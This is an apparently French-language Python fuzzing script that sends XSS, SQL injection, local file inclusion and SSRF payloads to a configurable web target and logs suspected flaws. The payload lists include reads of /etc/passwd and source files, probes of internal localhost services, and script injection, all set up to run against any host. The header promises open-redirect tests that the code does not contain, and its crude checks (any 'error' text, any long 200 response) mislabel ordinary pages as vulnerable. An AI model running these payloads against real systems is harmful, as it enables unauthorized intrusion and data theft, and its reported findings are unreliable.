#!/usr/bin/env python3
"""
Script de fuzzing automatique pour applications web
Teste XSS, SQLi, LFI, SSRF, Open Redirect
"""

import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# CONFIGURATION - Modifiez ces variables selon votre cible
# ============================================================

# URL cible (sans slash final)
TARGET = "http://example.com"

# Timeout des requêtes (en secondes)
REQUEST_TIMEOUT = 5

# Fichier de sortie des résultats
OUTPUT_FILE = "fuzzing_results.txt"

# Payloads XSS
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)",
]

# Payloads SQLi
SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'#",
    "' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
]

# Payloads LFI
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
]

# Payloads SSRF
SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://localhost:9002",
    "http://localhost:3306",
    "file:///etc/passwd",
]

# Endpoints à tester (FUZZ sera remplacé par les payloads)
ENDPOINTS = [
    "/search?search_query=FUZZ",
    "/product/view?id=FUZZ",
    "/category?id=FUZZ",
    "/user/view?id=FUZZ",
    "/documents?file=FUZZ",
    "/redirect?url=FUZZ",
]

# ============================================================
# FIN DE LA CONFIGURATION
# ============================================================

def test_xss(url):
    """Teste XSS sur un endpoint"""
    results = []
    for payload in XSS_PAYLOADS:
        try:
            test_url = url.replace("FUZZ", urllib.parse.quote(payload))
            r = requests.get(test_url, timeout=REQUEST_TIMEOUT)
            if payload in r.text or "<script>" in r.text:
                results.append(f"✅ XSS trouvé: {test_url}")
        except:
            pass
    return results

def test_sqli(url):
    """Teste SQLi sur un endpoint"""
    results = []
    for payload in SQLI_PAYLOADS:
        try:
            test_url = url.replace("FUZZ", urllib.parse.quote(payload))
            r = requests.get(test_url, timeout=REQUEST_TIMEOUT)
            if "sql" in r.text.lower() or "mysql" in r.text.lower() or "error" in r.text.lower():
                results.append(f"✅ SQLi possible: {test_url}")
        except:
            pass
    return results

def test_lfi(url):
    """Teste LFI sur un endpoint"""
    results = []
    for payload in LFI_PAYLOADS:
        try:
            test_url = url.replace("FUZZ", urllib.parse.quote(payload))
            r = requests.get(test_url, timeout=REQUEST_TIMEOUT)
            if "root:" in r.text or "<?php" in r.text:
                results.append(f"✅ LFI trouvé: {test_url}")
        except:
            pass
    return results

def test_ssrf(url):
    """Teste SSRF sur un endpoint"""
    results = []
    for payload in SSRF_PAYLOADS:
        try:
            test_url = url.replace("FUZZ", urllib.parse.quote(payload))
            r = requests.get(test_url, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200 and len(r.text) > 100:
                results.append(f"✅ SSRF possible: {test_url}")
        except:
            pass
    return results

def main():
    print("🔥 Fuzzing automatique")
    print("=" * 50)
    print(f"Cible: {TARGET}")
    print("=" * 50)
    
    all_results = []
    
    for endpoint in ENDPOINTS:
        url = TARGET + endpoint
        print(f"\n🎯 Test de: {endpoint}")
        
        # Test XSS
        print("  - XSS...", end=" ")
        xss = test_xss(url)
        all_results.extend(xss)
        print(f"{len(xss)} trouvé(s)")
        
        # Test SQLi
        print("  - SQLi...", end=" ")
        sqli = test_sqli(url)
        all_results.extend(sqli)
        print(f"{len(sqli)} trouvé(s)")
        
        # Test LFI
        print("  - LFI...", end=" ")
        lfi = test_lfi(url)
        all_results.extend(lfi)
        print(f"{len(lfi)} trouvé(s)")
        
        # Test SSRF
        print("  - SSRF...", end=" ")
        ssrf = test_ssrf(url)
        all_results.extend(ssrf)
        print(f"{len(ssrf)} trouvé(s)")
    
    print("\n" + "=" * 50)
    print(f"📊 RÉSULTATS FINAUX: {len(all_results)} failles trouvées")
    print("=" * 50)
    
    for result in all_results:
        print(result)
    
    # Sauvegarde résultats
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(all_results))
    
    print(f"\n💾 Résultats sauvegardés dans {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
